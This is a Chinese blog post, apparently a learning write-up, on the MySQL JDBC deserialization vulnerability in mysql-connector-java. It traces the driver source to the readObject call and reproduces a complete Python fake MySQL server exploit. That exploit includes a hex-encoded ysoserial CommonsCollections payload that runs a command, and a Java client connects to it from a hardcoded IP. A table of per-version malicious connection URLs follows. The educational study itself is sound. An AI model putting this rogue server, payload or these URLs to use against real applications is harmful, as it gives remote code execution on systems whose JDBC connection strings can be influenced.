# 前言

这篇稍微学习一下JDBC反序列化的漏洞原理，不同的版本有些许的区别，但主要就是两种利用方式，主要还是了解其中的原理，后面的POC编写那块看的有点懵，没看太懂，就只能直接用着大师傅们的脚本了。



# ServerStatusDiffInterceptor利用

`ServerStatusDiffInterceptor`我本地复现用的是：

```xml
        <dependency>
            <groupId>mysql</groupId>
            <artifactId>mysql-connector-java</artifactId>
            <version>8.0.12</version>
        </dependency>
```

关于版本的问题，最后会提到。

JDBC反序列化是BlackHat Europe 2019会议中的一个议题。

JDBC反序列化攻击成功就需要JDBC连接的时候，那个url可控：

```java
package com.feng.test;

import java.sql.Connection;
import java.sql.DriverManager;

public class Test {
    public static void main(String[] args) throws Exception{
        Class.forName("com.mysql.jdbc.Driver");
        String url = "jdbc:mysql://118.31.168.198:33306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor";
        String username = "root";
        String password = "root";
        Connection connection = DriverManager.getConnection(url, username, password);

    }

}

```





注意到连接多了两个参数：

```java
autoDeserialize=true
queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor 
```



属性`queryInterceptors`是查询拦截器，说白了就是一种过滤器，作用可能有点类似php中的`__wakeup`？

属性设置为`com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor `这个类之后，每次执行查询语句，都会调用拦截器的`preProcess`和`postProcess`方法。

而利用就在于`com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor`类的`preProcess()`方法：

```java
    @Override
    public <T extends Resultset> T preProcess(Supplier<String> sql, Query interceptedQuery) {

        populateMapWithSessionStatusValues(this.preExecuteValues);

        return null; // we don't actually modify a result set
    }
```

跟进`populateMapWithSessionStatusValues()`：

```java
    private void populateMapWithSessionStatusValues(Map<String, String> toPopulate) {
        java.sql.Statement stmt = null;
        java.sql.ResultSet rs = null;

        try {
            try {
                toPopulate.clear();

                stmt = this.connection.createStatement();
                rs = stmt.executeQuery("SHOW SESSION STATUS");
                ResultSetUtil.resultSetToMap(toPopulate, rs);
```

先是执行了一条查询`SHOW SESSION STATUS`，获取这个查询的结果集`rs`，然后进入`resultSetToMap()`方法：

```java
    public static void resultSetToMap(Map mappedValues, ResultSet rs) throws SQLException {
        while (rs.next()) {
            mappedValues.put(rs.getObject(1), rs.getObject(2));
        }
    }
```

一个非常非常让人激动的方法，`getObject()`出现了。原作者关注到了`ResultSet`的实现类`ResultSetImpl`类的`getObject()`方法：

```java
    @Override
    public Object getObject(int columnIndex) throws SQLException {
        checkRowPos();
        checkColumnBounds(columnIndex);

        int columnIndexMinusOne = columnIndex - 1;

        // we can't completely rely on code below because primitives have default values for null (e.g. int->0)
        if (this.thisRow.getNull(columnIndexMinusOne)) {
            return null;
        }

        Field field = this.columnDefinition.getFields()[columnIndexMinusOne];
        switch (field.getMysqlType()) {
            case BIT:
                // TODO Field sets binary and blob flags if the length of BIT field is > 1; is it needed at all?
                if (field.isBinary() || field.isBlob()) {
                    byte[] data = getBytes(columnIndex);

                    if (this.connection.getPropertySet().getBooleanProperty(PropertyDefinitions.PNAME_autoDeserialize).getValue()) {
                        Object obj = data;

                        if ((data != null) && (data.length >= 2)) {
                            if ((data[0] == -84) && (data[1] == -19)) {
                                // Serialized object?
                                try {
                                    ByteArrayInputStream bytesIn = new ByteArrayInputStream(data);
                                    ObjectInputStream objIn = new ObjectInputStream(bytesIn);
                                    obj = objIn.readObject();
                                    objIn.close();
                                    bytesIn.close();
                                } catch (ClassNotFoundException cnfe) {
                                    throw SQLError.createSQLException(Messages.getString("ResultSet.Class_not_found___91") + cnfe.toString()
                                            + Messages.getString("ResultSet._while_reading_serialized_object_92"), getExceptionInterceptor());
                                } catch (IOException ex) {
                                    obj = data; // not serialized?
                                }
                            } else {
                                return getString(columnIndex);
                            }
                        }

                        return obj;
                    }

                    return data;
                }

                return field.isSingleBit() ? Boolean.valueOf(getBoolean(columnIndex)) : getBytes(columnIndex);

```

比较长，大致理一下思路叭。先是计算`columnIndexMinusOne`，然后根据这个得到`Field`，如果type是BIT，再判断数据是不是blob或者二进制数据，如果是就得到连接属性中的`autoDeserialize`是不是为true（所以给它设置为true）。然后再判断数据大小是不是大于2，是的话就判断第一个字节和第二个字节是不是-84和-19（Java中序列化后的对象的前两个字节是-84和-19，这是Java的一个标识），如果是就是激动人心的时刻了：

```java
ByteArrayInputStream bytesIn = new ByteArrayInputStream(data);
ObjectInputStream objIn = new ObjectInputStream(bytesIn);
obj = objIn.readObject();
objIn.close();
bytesIn.close();
```

进行反序列化。我环境中带了`commons-collections 3.1`，这样就可以直接反序列化rce了。



思路比较容易理清，但关键就是，`SHOW SESSION STATUS`这个查询的返回的结果集如何编写。这个就比较难了，看下面的参考文章也没有看太懂，所以就只能直接用POC了：

```python
# -*- coding:utf-8 -*-
#@Time : 2020/7/27 2:10
#@Author: Tri0mphe7
#@File : server.py
import socket
import binascii
import os

greeting_data="4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400"
response_ok_data="0700000200000002000000"

def receive_data(conn):
    data = conn.recv(1024)
    print("[*] Receiveing the package : {}".format(data))
    return str(data).lower()

def send_data(conn,data):
    print("[*] Sending the package : {}".format(data))
    conn.send(binascii.a2b_hex(data))

def get_payload_content():
    //file文件的内容使用ysoserial生成的 使用规则  java -jar ysoserial [common7那个]  "calc" > a 
    file= r'a'
    if os.path.isfile(file):
        with open(file, 'rb') as f:
            payload_content = str(binascii.b2a_hex(f.read()),encoding='utf-8')
        print("open successs")

    else:
        print("open false")
        #calc
        payload_content='aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878'
    return payload_content

# 主要逻辑
def run():

    while 1:
        conn, addr = sk.accept()
        print("Connection come from {}:{}".format(addr[0],addr[1]))

        # 1.先发送第一个 问候报文
        send_data(conn,greeting_data)

        while True:
            # 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok
            receive_data(conn)
            send_data(conn,response_ok_data)

            #其他过程
            data=receive_data(conn)
            #查询一些配置信息,其中会发送自己的 版本号
            if "session.auto_increment_increment" in data:
                _payload='01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000'
                send_data(conn,_payload)
                data=receive_data(conn)
            elif "show warnings" in data:
                _payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000'
                send_data(conn, _payload)
                data = receive_data(conn)
            if "set names" in data:
                send_data(conn, response_ok_data)
                data = receive_data(conn)
            if "set character_set_results" in data:
                send_data(conn, response_ok_data)
                data = receive_data(conn)
            if "show session status" in data:
                mysql_data = '0100000102'
                mysql_data += '1a000002036465660001630163016301630c3f00ffff0000fc9000000000'
                mysql_data += '1a000003036465660001630163016301630c3f00ffff0000fc9000000000'
                # 为什么我加了EOF Packet 就无法正常运行呢？？
                //获取payload
                payload_content=get_payload_content()
                //计算payload长度
                payload_length = str(hex(len(payload_content)//2)).replace('0x', '').zfill(4)
                payload_length_hex = payload_length[2:4] + payload_length[0:2]
                //计算数据包长度
                data_len = str(hex(len(payload_content)//2 + 4)).replace('0x', '').zfill(6)
                data_len_hex = data_len[4:6] + data_len[2:4] + data_len[0:2]
                mysql_data += data_len_hex + '04' + 'fbfc'+ payload_length_hex
                mysql_data += str(payload_content)
                mysql_data += '07000005fe000022000100'
                send_data(conn, mysql_data)
                data = receive_data(conn)
            if "show warnings" in data:
                payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000'
                send_data(conn, payload)
            break


if __name__ == '__main__':
    HOST ='0.0.0.0'
    PORT = 3309

    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间
    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sk.bind((HOST, PORT))
    sk.listen(1)

    print("start fake mysql server listening on {}:{}".format(HOST,PORT))

    run()
```







# 版本

另外的`detectCustomCollations`攻击方式就不看了，区别也不太大。

fnmsd师傅对于版本这方面也总结的比较透彻了，直接放他的总结结果了：

> ServerStatusDiffInterceptor触发：
>
> 8.x:jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc
>
> 6.x(属性名不同):jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc
>
> 5.1.11及以上的5.x版本（包名没有了cj）:jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc
>
> 5.1.10及以下的5.1.X版本： 同上，但是需要连接后执行查询。
>
> 5.0.x: 还没有ServerStatusDiffInterceptor这个东西┓( ´∀` )┏
>
> detectCustomCollations触发：
>
> 5.1.41及以上: 不可用
>
> 5.1.29-5.1.40:jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=yso_JRE8u20_calc
>
> 5.1.28-5.1.19：jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&user=yso_JRE8u20_calc
>
> 5.1.18以下的5.1.x版本： 不可用
>
> 5.0.x版本不可用



# 总结

自己还是太菜了呜呜，POC那里看不懂细节，Java小白还是得慢慢学习呀，以后再回来补充细节。



# 参考文章

https://blog.csdn.net/fnmsd/article/details/106232092

https://xz.aliyun.com/t/8159

https://www.mi1k7ea.com/2021/04/23/MySQL-JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/

http://m0d9.me/2021/04/20/Jdbc-%E7%A2%8E%E7%A2%8E%E5%BF%B5%E4%BA%8C%EF%BC%9AMySQL-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/

